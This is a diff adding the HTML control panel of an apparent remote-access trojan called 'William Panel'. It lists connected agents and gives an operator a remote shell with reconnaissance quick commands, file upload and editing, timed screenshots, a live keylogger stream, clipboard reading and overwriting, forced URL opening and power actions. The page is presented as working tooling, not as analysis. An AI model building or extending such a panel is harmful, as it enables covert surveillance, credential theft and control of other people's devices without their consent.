@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>William Panel</title>
+<link rel="stylesheet" href="css/style.css"/>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div id="loginScreen">
+  <div class="login-box">
+    <div class="login-logo">⚡ WILLIAM PANEL</div>
+    <div class="login-sub">Remote Device Control</div>
+    <input type="password" id="loginPass" placeholder="Password" autocomplete="off"/>
+    <button onclick="doLogin()">Enter</button>
+    <div id="loginErr" class="err-msg"></div>
+  </div>
+</div>
+
+<!-- MAIN PANEL -->
+<div id="mainPanel" class="hidden">
+  <aside id="sidebar">
+    <div class="sidebar-header">
+      <span>⚡ W-PANEL</span>
+      <div class="online-badge" id="deviceCount">0 online</div>
+    </div>
+    <div class="sidebar-section">DEVICES</div>
+    <div id="deviceList"></div>
+    <div class="sidebar-section" style="margin-top:auto">
+      <div class="keylog-toggle">
+        <span>🎹 Keylog Stream</span>
+        <label class="switch"><input type="checkbox" id="keylogToggle"/><span class="slider"></span></label>
+      </div>
+    </div>
+  </aside>
+
+  <main id="content">
+    <div id="noDevice" class="no-device">
+      <div class="nd-icon">📡</div>
+      <div>No device selected</div>
+      <div class="nd-sub">Pick a device from the left or wait for agents to connect</div>
+    </div>
+
+    <div id="devicePanel" class="hidden">
+      <!-- Top bar -->
+      <div class="topbar">
+        <div id="tbHostname" class="tb-hostname"></div>
+        <div class="tb-actions">
+          <button class="btn-tb" onclick="refreshSysInfo()"><i class="fa fa-microchip"></i> Info</button>
+          <button class="btn-tb" onclick="takeScreenshot()"><i class="fa fa-camera"></i> Screenshot</button>
+          <button class="btn-tb" onclick="loadProcesses()"><i class="fa fa-list"></i> Processes</button>
+          <button class="btn-tb btn-warn" onclick="showPowerMenu()"><i class="fa fa-power-off"></i> Power</button>
+        </div>
+      </div>
+
+      <!-- Tabs -->
+      <div class="tabs">
+        <button class="tab active" onclick="switchTab('shell')">💻 Shell</button>
+        <button class="tab" onclick="switchTab('files')">📁 Files</button>
+        <button class="tab" onclick="switchTab('screenshot')">📸 Screenshot</button>
+        <button class="tab" onclick="switchTab('processes')">⚙️ Processes</button>
+        <button class="tab" onclick="switchTab('sysinfo')">🖥️ System</button>
+        <button class="tab" onclick="switchTab('keylog')">🎹 Keylog</button>
+        <button class="tab" onclick="switchTab('clipboard')">📋 Clipboard</button>
+        <button class="tab" onclick="switchTab('more')">🔧 More</button>
+      </div>
+
+      <!-- SHELL TAB -->
+      <div id="tab-shell" class="tab-content active">
+        <div id="shellOutput" class="shell-output"></div>
+        <div class="shell-input-row">
+          <span class="shell-prompt">$</span>
+          <input type="text" id="shellInput" placeholder="command..." onkeydown="shellKey(event)" autocomplete="off"/>
+          <button onclick="sendShell()">Run</button>
+          <button onclick="clearShell()" class="btn-clear">Clear</button>
+        </div>
+        <div class="shell-quick">
+          <button onclick="quickCmd('whoami')">whoami</button>
+          <button onclick="quickCmd('ipconfig || ifconfig')">ip</button>
+          <button onclick="quickCmd('dir || ls -la')">ls</button>
+          <button onclick="quickCmd('systeminfo || uname -a')">sysinfo</button>
+          <button onclick="quickCmd('tasklist || ps aux')">processes</button>
+          <button onclick="quickCmd('netstat -an')">netstat</button>
+        </div>
+      </div>
+
+      <!-- FILES TAB -->
+      <div id="tab-files" class="tab-content hidden">
+        <div class="file-nav">
+          <button onclick="navUp()"><i class="fa fa-arrow-up"></i> Up</button>
+          <input type="text" id="filePath" value="/" placeholder="path"/>
+          <button onclick="loadFiles()">Go</button>
+          <button onclick="uploadFile()" class="btn-green"><i class="fa fa-upload"></i> Upload</button>
+          <button onclick="newFile()" class="btn-blue"><i class="fa fa-plus"></i> New File</button>
+        </div>
+        <div id="fileBreadcrumb" class="breadcrumb"></div>
+        <div id="fileList" class="file-list"></div>
+        <div id="fileEditor" class="file-editor hidden">
+          <div class="fe-header">
+            <span id="feFilename"></span>
+            <button onclick="saveFile()" class="btn-green">Save</button>
+            <button onclick="closeEditor()">Close</button>
+          </div>
+          <textarea id="feContent"></textarea>
+        </div>
+        <input type="file" id="uploadInput" style="display:none" onchange="doUpload(event)"/>
+      </div>
+
+      <!-- SCREENSHOT TAB -->
+      <div id="tab-screenshot" class="tab-content hidden">
+        <div class="ss-controls">
+          <button onclick="takeScreenshot()"><i class="fa fa-camera"></i> Take Screenshot</button>
+          <button onclick="autoScreenshot()" id="autoSSBtn">⏱ Auto (5s)</button>
+          <button onclick="saveScreenshot()" class="btn-green"><i class="fa fa-download"></i> Save</button>
+        </div>
+        <div id="ssContainer" class="ss-container">
+          <div class="ss-placeholder">Click "Take Screenshot"</div>
+        </div>
+        <div id="ssTimestamp" class="ss-ts"></div>
+      </div>
+
+      <!-- PROCESSES TAB -->
+      <div id="tab-processes" class="tab-content hidden">
+        <div class="proc-controls">
+          <button onclick="loadProcesses()"><i class="fa fa-refresh"></i> Refresh</button>
+          <input type="text" id="procSearch" placeholder="Search process..." oninput="filterProc()"/>
+        </div>
+        <div id="procList" class="proc-list"></div>
+      </div>
+
+      <!-- SYSINFO TAB -->
+      <div id="tab-sysinfo" class="tab-content hidden">
+        <button onclick="refreshSysInfo()"><i class="fa fa-refresh"></i> Refresh</button>
+        <div id="sysinfoGrid" class="sysinfo-grid"></div>
+      </div>
+
+      <!-- KEYLOG TAB -->
+      <div id="tab-keylog" class="tab-content hidden">
+        <div class="kl-controls">
+          <button onclick="clearKeylog()" class="btn-clear">Clear</button>
+          <button onclick="copyKeylog()" class="btn-blue">Copy</button>
+          <span class="kl-hint">Keystrokes stream in real-time when agent has focus</span>
+        </div>
+        <div id="keylogOutput" class="keylog-output"></div>
+      </div>
+
+      <!-- CLIPBOARD TAB -->
+      <div id="tab-clipboard" class="tab-content hidden">
+        <div class="cb-controls">
+          <button onclick="getClipboard()"><i class="fa fa-paste"></i> Get Clipboard</button>
+        </div>
+        <div id="clipboardContent" class="cb-content">Click "Get Clipboard" to fetch device clipboard</div>
+        <hr/>
+        <div class="cb-set">
+          <div class="cb-set-label">Set clipboard on device:</div>
+          <textarea id="clipboardSet" placeholder="Text to set..."></textarea>
+          <button onclick="setClipboard()" class="btn-green">Set Clipboard</button>
+        </div>
+      </div>
+
+      <!-- MORE TAB -->
+      <div id="tab-more" class="tab-content hidden">
+        <div class="more-grid">
+          <div class="more-card">
+            <div class="mc-title">🌐 Open URL on Device</div>
+            <input type="text" id="openUrlInput" placeholder="https://..."/>
+            <button onclick="openUrl()">Open</button>
+          </div>
+          <div class="more-card">
+            <div class="mc-title">💬 Send Alert Popup</div>
+            <input type="text" id="alertInput" placeholder="Alert message..."/>
+            <button onclick="sendAlert()">Send</button>
+          </div>
+          <div class="more-card">
+            <div class="mc-title">⚡ Power Actions</div>
+            <div class="power-btns">
+              <button onclick="powerAction('shutdown')" class="btn-warn">Shutdown</button>
+              <button onclick="powerAction('restart')" class="btn-warn">Restart</button>
+              <button onclick="powerAction('logoff')">Log Off</button>
+              <button onclick="powerAction('sleep')">Sleep</button>
+            </div>
+          </div>
+          <div class="more-card">
+            <div class="mc-title">📡 Agent Info</div>
+            <div id="agentRawInfo" class="agent-raw"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Keylog side panel -->
+  <div id="keylogPanel" class="keylog-side hidden">
+    <div class="ksp-header">🎹 Global Keylog Stream</div>
+    <div id="keylogSideOutput" class="ksl-out"></div>
+    <button onclick="clearSideKeylog()" class="btn-clear">Clear</button>
+  </div>
+</div>
+
+<!-- MODALS -->
+<div id="modal" class="modal hidden">
+  <div class="modal-box">
+    <div id="modalTitle" class="modal-title"></div>
+    <div id="modalBody" class="modal-body"></div>
+    <button onclick="closeModal()">Close</button>
+  </div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script src="js/panel.js"></script>
+</body>
+</html>
